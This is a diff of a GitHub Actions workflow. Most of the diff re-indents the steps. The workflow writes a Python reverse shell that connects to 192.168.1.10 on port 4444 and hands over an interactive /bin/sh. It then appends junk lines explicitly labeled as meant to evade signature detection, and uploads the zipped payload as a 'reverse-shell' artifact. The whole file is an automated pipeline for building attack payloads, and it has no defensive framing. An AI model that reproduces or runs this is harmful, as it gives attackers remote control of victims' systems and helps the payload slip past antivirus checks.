@@ -9,45 +9,47 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
+    - name: Checkout Repository
+      uses: actions/checkout@v4
 
-      - name: Setup Python
-        uses: actions/setup-python@v4
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
 
-      - name: Create Reverse Shell Payload
-        run: |
-          cat << EOF > shell.py
-          import socket
-          import subprocess
-          import os
+    - name: Create Reverse Shell Payload
+      run: |
+        cat << EOF > shell.py
+        import socket
+        import subprocess
+        import os
 
-          def reverse_shell():
-              host = "192.168.1.10"
-              port = 4444
-              try:
-                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                  s.connect((host, port))
-                  os.dup2(s.fileno(), 0)
-                  os.dup2(s.fileno(), 1)
-                  os.dup2(s.fileno(), 2)
-                  subprocess.call(["/bin/sh", "-i"])
-              except:
-                  pass
+        def reverse_shell():
+            host = "192.168.1.10"
+            port = 4444
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((host, port))
+                os.dup2(s.fileno(), 0)
+                os.dup2(s.fileno(), 1)
+                os.dup2(s.fileno(), 2)
+                subprocess.call(["/bin/sh", "-i"])
+            except:
+                pass
 
-          reverse_shell()
-          EOF
+        reverse_shell()
+        EOF
 
-      - name: Obfuscate Payload (Add junk code)
-        run: |
-          echo "# Junk Code to evade signature" >> shell.py
-          echo "junk = 42 * 42" >> shell.py
+    - name: Obfuscate Payload (Add junk code)
+      run: |
+        echo "\n# Junk Code to evade signature" >> shell.py
+        echo "junk = 42 * 42" >> shell.py
 
-      - name: Archive the Payload
-        run: zip payload.zip shell.py
+    - name: Archive the Payload
+      run: zip payload.zip shell.py
 
-      - name: Upload Payload Artifact
-        uses: actions/upload-artifact@v3
-        with:
-          name: reverse-shell
-          path: payload.zip
+    - name: Upload Payload Artifact
+      uses: actions/upload-artifact@v2   
+      with:
+        name: reverse-shell
+        path: payload.zip
